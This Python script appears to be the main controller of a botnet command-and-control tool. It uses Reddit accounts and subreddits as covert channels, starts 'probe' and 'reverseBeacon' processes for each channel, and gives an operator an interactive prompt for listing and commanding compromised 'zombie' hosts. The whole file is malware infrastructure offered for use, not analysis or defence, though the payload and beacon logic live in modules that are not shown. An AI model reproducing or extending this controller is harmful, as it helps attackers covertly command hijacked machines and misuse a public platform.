#!/usr/bin/env python3

import os
import prawcore
import multiprocessing
import time
import sys


import ui
import database
import engine
from zombie import zombie
import globals

def main():

	ui.printBanner()
	channels = engine.parseChannelConfig()
	database.wipeZombieDb()


	for channel in channels:
		try:
			channel.clearChannel()
		except prawcore.exceptions.ResponseException:
			print(f"{ui.RED_MINUS} Authentication error for master account {ui.WHITE_B}{channel.account.user}{ui.RESET}. Please ensure your configured accounts are correct.")
			sys.exit(1)

		time.sleep(5)
		print(f"{ui.notif_green()} Channel {ui.WHITE_B}{channel.account.user}->{channel.subreddit}{ui.RESET} established.")
		probe = multiprocessing.Process(target=channel.runProbe)
		probe.start()
		beacon = multiprocessing.Process(target=channel.reverseBeacon)
		beacon.start()
		watchTimes = multiprocessing.Process(target=engine.watchTimes)
		watchTimes.start()

	inCommand = None
	while True:
		listenCount = len(channels)
		zombieCount = 0
		zombieCount = database.getZombieCount()
		if not inCommand:
			prompt = ui.buildPrompt(zombieCount, listenCount, "main", 0)
		elif inCommand:
			prompt = ui.buildPrompt(zombieCount, listenCount, "command", inCommand.zid)

		userSelect = input(prompt)

		if not inCommand:
			returnCode = engine.parseMainCommand(userSelect.lower().strip())
		elif inCommand:
			returnCode = engine.parseInteractCommand(userSelect.lower().strip(), zombie)
	
		# because threading/multi-processing design is so badly done, Every action
		# should eventually return back to main. This allows exits and whatnot to be
		# handled as gracefully as possible.

		if returnCode == 0:
			None
		
		elif returnCode == 1:
			None

		elif returnCode == 127:
			del inCommand
			inCommand = None

		# if a non-integer is returned, it means a zombie object was returned, indicating a change in mode.
		elif type(returnCode) != int:
			zombie = returnCode
			inCommand = zombie

		# its terrible, I know. I need to re-write the multiprocessing and stuff
		# to make the control flow cleaner.
		elif returnCode == 255:
			print(f"{ui.notif_yellow()} Cleaning up. Exiting in a moment . . .")
			database.wipeZombieDb()
			for channel in channels:
				channel.clearChannel()
			probe.terminate()
			probe.join()
			beacon.terminate()
			beacon.join()
			watchTimes.terminate()
			watchTimes.join()
			break

	return 0

main()
